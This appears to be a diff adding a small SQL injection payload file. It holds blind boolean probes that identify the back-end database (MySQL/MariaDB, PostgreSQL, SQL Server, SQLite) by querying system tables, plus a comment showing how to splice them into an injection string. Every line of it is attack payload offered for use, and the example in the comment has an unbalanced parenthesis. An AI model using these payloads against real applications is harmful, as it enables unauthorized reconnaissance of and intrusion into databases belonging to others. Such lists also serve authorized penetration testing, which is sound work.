@@ -1,0 +1,13 @@
+##Replace below with whatever worked for boolean sql true or false, eg. ' or 1=1 --, then you must inject like ' or 1=(SELECT COUNT(*) FROM information_schema.tables)>0)
+
+-- MySQL/MariaDB (works if true)
+(SELECT COUNT(*) FROM information_schema.tables)>0
+
+-- PostgreSQL (works if true)
+(SELECT COUNT(*) FROM information_schema.tables)>0
+
+-- SQL Server (works if true)
+(SELECT COUNT(*) FROM sysobjects)>0
+
+-- SQLite (works if true)
+(SELECT COUNT(*) FROM sqlite_master)>0
